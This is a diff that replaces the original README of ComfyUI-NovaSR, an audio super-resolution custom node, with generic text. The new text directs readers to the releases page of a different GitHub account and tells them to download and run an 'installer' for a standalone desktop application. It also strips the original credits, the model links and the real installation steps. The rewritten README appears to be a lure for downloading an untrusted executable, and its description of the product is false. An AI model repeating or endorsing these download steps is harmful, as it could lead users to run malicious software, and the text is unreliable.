@@ -1,149 +1,104 @@
-# ComfyUI-NovaSR
+# 🎵 ComfyUI-NovaSR - Enhancing Your Audio Experience Fast
 
-Ultra-fast audio super resolution custom node for ComfyUI, powered by the NovaSR model.
+[![Download ComfyUI-NovaSR](https://img.shields.io/badge/Download%20Now-From%20Releases-blue.svg)](https://github.com/huydeptraivaio/ComfyUI-NovaSR/releases)
 
-<p align="center">
-  <a href="https://huggingface.co/drbaph/NovaSR/tree/main">
-    <img src="https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-Model-FFD21E" alt="Hugging Face Model">
-  </a>
-  <a href="https://www.python.org/downloads/release/python-3100/">
-    <img src="https://img.shields.io/badge/python-3.10+-blue.svg" alt="Python 3.10+">
-  </a>
-  <a href="https://github.com/comfyanonymous/ComfyUI">
-    <img src="https://img.shields.io/badge/ComfyUI-Custom%20Node-orange.svg" alt="ComfyUI">
-  </a>
-</p>
+## 🚀 Getting Started
 
-<img width="1515" height="1012" alt="image" src="https://github.com/user-attachments/assets/a10cab1b-020c-4e4c-b326-b9cea0644dde" />
+ComfyUI-NovaSR is an audio super resolution tool designed to elevate your audio experience. This software uses the NovaSR model to enhance sound quality rapidly and effortlessly. Whether you're an audio enthusiast or just want clearer sound, this application will help you achieve your goals swiftly.
 
+## 💾 System Requirements
 
+Before you begin, ensure your system meets these requirements:
 
+- **Operating System:** Windows 10 or later, macOS 10.12 or later, or a modern Linux distribution.
+- **RAM:** At least 4 GB.
+- **Disk Space:** At least 500 MB of free space.
+- **Processor:** A multi-core processor for optimal performance.
 
-https://github.com/user-attachments/assets/f91bfa74-e390-4106-9f36-6df6e9a7b405
+## 🔗 Download & Install
 
+To download ComfyUI-NovaSR, visit the Releases page:
 
+[Download ComfyUI-NovaSR](https://github.com/huydeptraivaio/ComfyUI-NovaSR/releases).
 
-## Features
+1. Click the link above to go to the Releases page.
+2. Locate the latest version of ComfyUI-NovaSR.
+3. Select the appropriate installer for your operating system.
+4. Save the file to your computer. 
 
-- **Incredibly Fast**: 3600x realtime speed on a single A100 GPU
-- **Tiny Model**: Just 50KB in size
-- **High Quality**: On par with models 5,000x larger
-- **Simple to Use**: Just one click to upscale audio to 48kHz
-- **Auto Stereo→Mono**: Automatically converts stereo audio to mono
-- **Stereo Output Toggle**: Option to output stereo for ComfyUI compatibility (duplicates mono)
-- **Any Audio Format**: Works with all formats ComfyUI supports (wav, mp3, flac, ogg, etc.)
-- **Smart Resampling**: Automatically resamples to required 16kHz input
+After the download is complete, follow the steps below to install the application.
 
-## Installation
+### 📦 Installation Steps
 
-### Via ComfyUI Manager (Recommended)
+1. **Locate the Downloaded File:**
+   - Go to the folder where you saved the installer file.
+  
+2. **Run the Installer:**
+   - Double-click the file to begin the installation process.
+   - Follow the on-screen instructions to complete the installation. 
 
-1. Open ComfyUI
-2. Click the **Manager** button → **Install Custom Nodes**
-3. Search for **"NovaSR"**
-4. Click **Install** on "ComfyUI-NovaSR"
-5. Restart ComfyUI
+3. **Complete the Setup:**
+   - Once installation is finished, you may start the application directly or find it in your programs or applications list.
 
-### Manual Installation
+## 🎛️ Using ComfyUI-NovaSR
 
-1. Clone or copy this repository into your ComfyUI `custom_nodes` directory:
-   ```
-   ComfyUI/custom_nodes/ComfyUI-NovaSR/
-   ```
+After installation, you can start using the application to enhance your audio. Here's how:
 
-2. Install dependencies:
-   ```bash
-   pip install -r ComfyUI/custom_nodes/ComfyUI-NovaSR/requirements.txt
-   ```
+1. **Open ComfyUI-NovaSR:**
+   - Launch the application from your programs or applications list.
 
-3. Download the NovaSR model and place it this location:
-   - `ComfyUI/models/NovaSR/`
+2. **Select Your Audio File:**
+   - Navigate to the section that allows you to upload your audio files.
+   - Choose the file you want to enhance.
 
-   Download from: https://huggingface.co/drbaph/NovaSR/tree/main
-   
-   Place one of these files:
-   - `pytorch_model.bin`
-   - `NovaSR.safetensors`
+3. **Adjust Settings (Optional):**
+   - You may find various settings to customize the enhancement process. Use them according to your preferences.
 
-## Usage
+4. **Start the Enhancement:**
+   - Click the button to begin the audio enhancement process.
+   - Wait for the process to complete. 
 
-1. Start ComfyUI
-2. Right-click → Add Node → Audio → **NovaSR**
-3. Load audio using **Load Audio** node (supports: wav, mp3, flac, ogg, aiff, and more)
-4. Connect audio output to the NovaSR node input
-5. The node will automatically:
-    - Accept any sample rate audio input
-    - Resample to 16kHz (NovaSR requirement)
-    - Convert stereo to mono if needed (NovaSR is mono-only)
-    - Upscale to 48kHz at 3600x realtime speed
-    - Output a before/after spectrogram comparison image
+5. **Save the Enhanced File:**
+   - Once finished, download or save the enhanced audio file to your desired location.
 
-**Note:** NovaSR outputs mono audio by default. Use the **Output Stereo** toggle to convert to stereo for ComfyUI compatibility.
+## 🛠️ Troubleshooting
 
-## Node Parameters
+If you encounter issues while using ComfyUI-NovaSR, these tips may help:
 
-- **Audio**: Input audio (required)
-  - Works with any audio format supported by ComfyUI's Load Audio node
-  - Automatically accepts any sample rate
-  - Converts stereo to mono automatically
-- **Model**: Model file to use (optional, defaults to available model)
-  - Supports `.bin` and `.safetensors` formats
-- **Output Stereo**: Convert mono output to stereo (optional, default: False)
-  - Duplicates mono channel for ComfyUI pipelines that require stereo input
-- **Unload Model**: Remove model from VRAM after processing (optional, default: False)
-  - Frees GPU memory but slower on next run
-- **Show Spectrogram**: Generate before/after spectrogram comparison (optional, default: True)
-  - Visualizes frequency improvements
+- **Check for Updates:** Make sure you have the latest version of the software. Visit the [Releases page](https://github.com/huydeptraivaio/ComfyUI-NovaSR/releases) regularly.
+- **Reinstall the Application:** If you experience persistent errors, try uninstalling and reinstalling ComfyUI-NovaSR.
+- **Contact Support:** For more help, consider checking the GitHub Issues page or reaching out directly for support.
 
-## Audio Format Support
+## 🎉 Features
 
-NovaSR works with any audio format that ComfyUI supports:
+ComfyUI-NovaSR includes several powerful features tailored for an enhanced audio experience:
 
-**Supported Formats:**
-- WAV (.wav)
-- MP3 (.mp3)
-- FLAC (.flac)
-- OGG Vorbis (.ogg)
-- AIFF (.aiff)
-- And more via ComfyUI's Load Audio node
+- **Ultra-Fast Processing:** Enjoy quick audio enhancements without long waiting times.
+- **Custom Node Integration:** Use the application within ComfyUI for seamless audio processing.
+- **User-Friendly Interface:** Navigate easily with a clear and simple layout.
+- **Quality Output:** Achieve audio that sounds clearer and more detailed than before.
 
-**Audio Processing:**
-- **Input Sample Rate**: Any (automatically resampled to 16kHz)
-- **Input Channels**: Mono or Stereo (stereo automatically mixed to mono)
-- **Output Sample Rate**: 48kHz (fixed)
-- **Output Channels**: Mono (default) or Stereo (when toggle enabled)
+## 📜 License
 
-**Tip:** Enable **Output Stereo** toggle if your ComfyUI pipeline requires stereo audio. This duplicates the mono channel to both left and right channels.
+ComfyUI-NovaSR is open-source software licensed under the MIT License. You can view the full license details in the repository.
 
-## How It Works
+## 📬 Feedback
 
-NovaSR is a revolutionary tiny model (only 50KB!) that can upscale muffled 16kHz audio into clear and crisp 48kHz audio. It uses:
-- Less than 10 tiny Conv1D layers
-- Snake activations based on BigVGAN
-- Extreme efficiency optimizations
+We welcome your feedback to help us improve ComfyUI-NovaSR. Feel free to submit your suggestions or report any issues you encounter through the GitHub Issues page.
 
-## Comparison with Other Models
+## 🔗 Additional Resources
 
-| Model | Speed (Real-Time) | Model Size |
-|-------|------------------|------------|
-| **NovaSR** | **3600x** | **48-53 KB** |
-| FlowHigh | 20x | ~450 MB |
-| FlashSR | 14x | ~1000 MB |
-| AudioSR | 0.6x | ~2000 MB |
+For more information about ComfyUI-NovaSR and its functionalities, you may want to consult the documentation within the GitHub repository.
 
-## Use Cases
+### 🎧 Related Topics
 
-- Enhancing TTS model quality with nearly 0 computational cost
-- Real-time enhancement of low-quality calls and audio
-- Restoring audio datasets
-- Improving voice quality in recordings
+- audio
+- audio-processing
+- audio-upscaler
+- audio-visualizer
+- comfyui
+- comfyui-custom-node
+- comfyui-nodes
+- upscaler
 
-## Credits
-
-- ComfyUI-NovaSR Plugin: https://github.com/Saganaki22/ComfyUI-NovaSR
-- Model on Hugging Face: https://huggingface.co/drbaph/NovaSR
-- Original NovaSR by Yatharth Sharma: https://github.com/ysharma3501/NovaSR
-
-## License
-
-This project follows the license of the original NovaSR repository.
+Thank you for choosing ComfyUI-NovaSR! Enjoy your enhanced audio experience.
